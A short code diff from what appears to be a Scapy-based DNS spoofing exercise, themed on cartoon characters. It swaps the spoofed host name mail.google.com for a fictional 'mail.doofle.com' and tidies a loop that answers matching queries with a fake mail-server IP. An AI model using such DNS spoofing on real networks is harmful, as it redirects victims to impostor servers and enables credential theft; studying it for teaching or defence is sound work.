@@ -16,7 +16,7 @@ FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    "mail.google.com": FAKE_GMAIL_IP
+    "mail.doofle.com": FAKE_GMAIL_IP
 
 }
 
@@ -194,7 +194,7 @@ class DnsHandler(object):
         if DNS in pkt and pkt[DNS].qd:
             query_name = pkt[DNS].qd.qname.decode()
 
-            for domain in self.spoof_dict.keys():
+            for domain in self.spoof_dict:
                 if domain == query_name:
                     response = self.get_spoofed_dns_response(pkt, self.spoof_dict[domain])
                     scapy.send(response, verbose=False)
